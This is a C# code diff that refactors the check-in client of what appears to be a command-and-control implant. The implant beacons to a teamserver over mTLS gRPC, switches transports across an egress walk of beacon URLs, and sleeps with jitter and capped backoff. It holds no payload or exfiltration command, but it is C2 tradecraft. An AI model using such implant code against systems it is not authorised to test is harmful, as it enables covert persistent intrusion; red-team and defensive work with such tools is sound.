@@ -19,20 +19,6 @@ namespace Rod.Implant.Internal;
 // Sec 10.3). The stream is bidirectional frames whose payloads are the rod.v1
 // handshake/task/result messages.
 
-// How a check-in client's run ended for the program's coordinator (see
-// Beacon.RunAsync and EnvelopeBeacon.RunAsync): terminated for good, or
-// yielded because the egress walk's current beacon URL belongs to the other
-// client -- a web URL (http(s)://) runs the envelope POST cycle, a bare
-// host:port runs this mTLS gRPC stream.
-internal enum CheckInExit
-{
-    // The kill date passed or the server refused the handshake permanently.
-    Terminate,
-
-    // The walk's current entry is the other client's URL shape; hand over.
-    SwitchTransport,
-}
-
 /// <summary>
 /// Runs the implant's check-in lifecycle against the teamserver: dial the mTLS
 /// endpoint, complete the handshake, then loop dispatching downstream tasks and
@@ -40,7 +26,7 @@ internal enum CheckInExit
 /// baked-in kill date passes. The cadence follows the baked-in sleep + jitter
 /// profile.
 /// </summary>
-internal sealed class Beacon
+internal sealed class Beacon : ICheckInClient
 {
     // How one check-in cycle uses the stream. Stream holds the connection open
     // for the life of the session -- the interactive shape, server-push
@@ -139,6 +125,13 @@ internal sealed class Beacon
     }
 
     /// <summary>
+    /// This client carries the bare host:port URL shape (architecture.md
+    /// Sec 8): the mTLS socket the gRPC stream dials. A schemed http(s)
+    /// beacon URL belongs to the envelope POST cycle client instead.
+    /// </summary>
+    public bool Serves(string beaconUrl) => !BeaconUrl.IsWeb(beaconUrl);
+
+    /// <summary>
     /// Blocks until cancellation or the kill date passing. Reconnects after a
     /// jittered sleep when the stream drops (implants are connection initiators;
     /// flapping is expected and handled by reconnecting, architecture.md Sec 8),
@@ -163,7 +156,7 @@ internal sealed class Beacon
             // web entry (http(s)://) is the envelope POST client's -- yield so
             // the coordinator hands the run over. Re-checked every cycle, so a
             // walk that crosses shapes re-routes at the next entry.
-            if (EnvelopeBeacon.IsWebBeaconUrl(_egress.CurrentBeaconUrl))
+            if (BeaconUrl.IsWeb(_egress.CurrentBeaconUrl))
                 return CheckInExit.SwitchTransport;
             var cycle = BeaconCycleResult.Dropped;
             try
@@ -208,7 +201,7 @@ internal sealed class Beacon
             }
             try
             {
-                await SleepWithJitterAsync(_sleep, _jitter, consecutiveFailures, cancellationToken);
+                await CheckInCadence.SleepWithJitterAsync(_sleep, _jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
@@ -760,33 +753,6 @@ internal sealed class Beacon
         {
             return false;
         }
-    }
-
-    // The failure counter's doubling cap: the reconnect delay grows as
-    // base * 2^failures up to 16x, keeping a down teamserver from being polled
-    // at beacon rate forever.
-    private const int MaxBackoffExponent = 4;
-
-    // Sleeps for the base interval (doubled per consecutive failure, capped)
-    // +/- jitter/2, honoring cancellation. Shared by both check-in clients --
-    // the envelope cycle backs off exactly like the stream.
-    internal static async Task SleepWithJitterAsync(
-        TimeSpan sleep,
-        TimeSpan jitter,
-        int consecutiveFailures,
-        CancellationToken cancellationToken)
-    {
-        var d = sleep;
-        for (var i = 0; i < Math.Min(consecutiveFailures, MaxBackoffExponent); i++)
-            d += d;
-        if (jitter > TimeSpan.Zero)
-        {
-            var deltaTicks = (long)(Random.Shared.NextDouble() * jitter.Ticks) - jitter.Ticks / 2;
-            d = d + TimeSpan.FromTicks(deltaTicks);
-        }
-        if (d < TimeSpan.Zero)
-            d = TimeSpan.Zero;
-        await Task.Delay(d, cancellationToken);
     }
 
     // Normalizes the beacon URL into the form GrpcChannel.ForAddress expects: a
